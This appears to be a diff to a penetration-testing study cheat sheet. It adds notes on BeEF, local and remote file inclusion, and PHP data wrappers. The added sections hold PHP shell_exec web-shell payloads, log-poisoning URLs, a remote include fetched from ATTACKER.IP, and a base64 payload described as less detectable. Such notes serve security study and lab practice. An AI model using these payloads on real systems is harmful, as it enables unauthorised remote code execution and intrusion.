@@ -139,7 +139,7 @@ This can be however filtered out by user's browser
 
 ### Use Kali's BeEF
 
-Test more XSS scenarios using BeEF tool.
+BeeF can be used to get system info, users, rev shell etc.
 
 ## Insecure Deserialization
 
@@ -181,7 +181,45 @@ Then find the framework on: https://wiki.owasp.org/index.php/OWASP_favicon_datab
 `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://ip/FUZZ` (FUZZ keyword is there where you want to fuzz)
 
 
-# Advanced Web Attacks
+# Other Web Attacks
+
+## LFI
+
+If it is possible to access servers files using web requests then get RCE with remote logs contamination
+
+1. Contaminate Logs
+` <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> `
+
+2. access these logs externally (xampp on windows in this case)
+
+`http://10.11.0.xx/menu.php?file=c:\xampp\apache\logs\access.log&cmd=whoami`
+
+## RFI
+
+* create malicious file evil.txt with payload for php or for any other platform
+
+`<?php echo shell_exec($_GET['cmd']); ?>`
+
+This is how evil.txt can be accessed from the victim host hosted on attacker side
+
+`http://VICTIM.IP/menu.php?file=http://ATTACKER.IP/evil.txt?`
+
+* Include %00 or ? to trick php into terminating the string or considering it as part of URL
+* To enhance attacks wrappers can be used. Here are php wrappers
+
+```
+#data wrapper
+http://10.11.xx.xx/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+```
+Payload after text/plain can either plain text or base64 encoded.
+
+Here follos example of base64 payload. Base64 is better as it is less detectable and causes less errors.
+
+```
+http://192.168.xxx.10/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+
+http://192.168.xxx.10/menu.php?file=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pg==
+```
 
 ## API
 
